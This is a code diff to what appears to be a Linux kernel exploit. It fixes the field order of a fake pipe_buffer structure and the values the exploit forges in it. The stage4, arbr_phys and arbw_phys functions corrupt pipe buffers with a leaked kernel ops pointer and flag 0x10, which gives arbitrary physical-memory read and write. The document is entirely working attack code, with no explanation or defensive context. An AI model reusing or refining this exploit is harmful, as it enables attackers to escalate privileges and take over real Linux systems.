@@ -205,8 +205,8 @@ void stage3(void)
 size_t arbrw_fd = -1;
 struct pipe_buffer {
     size_t page;
-    unsigned int len;
     unsigned int offset;
+    unsigned int len;
     size_t ops;
     unsigned int flags;
     size_t private;
@@ -239,14 +239,14 @@ void stage4(void)
     struct pipe_buffer *cor_pipe_buffer = (struct pipe_buffer *)buffer;
     struct pipe_buffer *next_cor_pipe_buffer = (struct pipe_buffer *)(buffer+1024);
 
-    cor_pipe_buffer->len = 8;
-    cor_pipe_buffer->offset = -PIPE_OFFSET;
+    cor_pipe_buffer->offset = 8;
+    cor_pipe_buffer->len = -PIPE_OFFSET;
     cor_pipe_buffer->ops = code_base+ANON_PIPE_BUF_OPS_OFFSET;
     cor_pipe_buffer->flags = 0x10;
 
     next_cor_pipe_buffer->page = vmemmap_base;
-    next_cor_pipe_buffer->len = 0;
-    next_cor_pipe_buffer->offset = PAGE_SIZE;
+    next_cor_pipe_buffer->offset = 0;
+    next_cor_pipe_buffer->len = PAGE_SIZE;
     next_cor_pipe_buffer->ops = code_base+ANON_PIPE_BUF_OPS_OFFSET;
     next_cor_pipe_buffer->flags = 0x10;
 
@@ -290,14 +290,14 @@ void arbr_phys(size_t paddr, size_t *addr)
     struct pipe_buffer *cor_pipe_buffer = (struct pipe_buffer *)buffer;
     struct pipe_buffer *next_cor_pipe_buffer = (struct pipe_buffer *)(buffer+1024);
 
-    cor_pipe_buffer->len = 8;
-    cor_pipe_buffer->offset = -PIPE_OFFSET;
+    cor_pipe_buffer->offset = 8;
+    cor_pipe_buffer->len = -PIPE_OFFSET;
     cor_pipe_buffer->ops = code_base+ANON_PIPE_BUF_OPS_OFFSET;
     cor_pipe_buffer->flags = 0x10;
 
     next_cor_pipe_buffer->page = PHYS_TO_VMEMMAP(paddr);
-    next_cor_pipe_buffer->len = paddr % PAGE_SIZE;
-    next_cor_pipe_buffer->offset = PAGE_SIZE;
+    next_cor_pipe_buffer->offset = paddr % PAGE_SIZE;
+    next_cor_pipe_buffer->len = PAGE_SIZE;
     next_cor_pipe_buffer->ops = code_base+ANON_PIPE_BUF_OPS_OFFSET;
     next_cor_pipe_buffer->flags = 0x10;
 
@@ -311,14 +311,14 @@ void arbw_phys(size_t paddr, size_t value)
     struct pipe_buffer *cor_pipe_buffer = (struct pipe_buffer *)buffer;
     struct pipe_buffer *next_cor_pipe_buffer = (struct pipe_buffer *)(buffer+1024);
 
-    cor_pipe_buffer->len = 8;
-    cor_pipe_buffer->offset = -PIPE_OFFSET;
+    cor_pipe_buffer->offset = 8;
+    cor_pipe_buffer->len = -PIPE_OFFSET;
     cor_pipe_buffer->ops = code_base+ANON_PIPE_BUF_OPS_OFFSET;
     cor_pipe_buffer->flags = 0x10;
 
     next_cor_pipe_buffer->page = PHYS_TO_VMEMMAP(paddr);
-    next_cor_pipe_buffer->len = 0;
-    next_cor_pipe_buffer->offset = paddr % PAGE_SIZE;
+    next_cor_pipe_buffer->offset = 0;
+    next_cor_pipe_buffer->len = paddr % PAGE_SIZE;
     next_cor_pipe_buffer->ops = code_base+ANON_PIPE_BUF_OPS_OFFSET;
     next_cor_pipe_buffer->flags = 0x10;
 
